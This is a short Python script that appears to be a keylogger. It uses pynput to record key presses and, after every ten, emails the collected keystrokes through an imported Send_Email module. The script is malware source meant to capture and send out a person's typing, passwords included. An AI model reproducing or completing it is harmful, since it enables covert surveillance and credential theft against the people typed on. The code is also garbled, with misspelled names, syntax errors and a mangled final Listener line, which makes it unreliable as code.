import pynput
from pynput.keyboard import Key, Listener
import Send_Email

count = 0
Keys = []

def on_press(Key):
    print(Key , end= " ")
    print("pressed")
    global Keys, count
    Key.append(str(Key))
    count += 1
    if count > 10:
        count = 0
        email(Keys)




def email(Keys):
    message = ""
    for key in Keys:
        k = Key.replace("'", "")
        if Key == "Key space":
            k = " "
        elif key.find("Key") > 0:
            K = " "
            message += k
        print(message)    
        send_email.sendEmail(message)



def on_release(key):
    if key == Key.ese
    return False


with Listener(on_press = on_press = on release = on on_release) as listener Listener.john()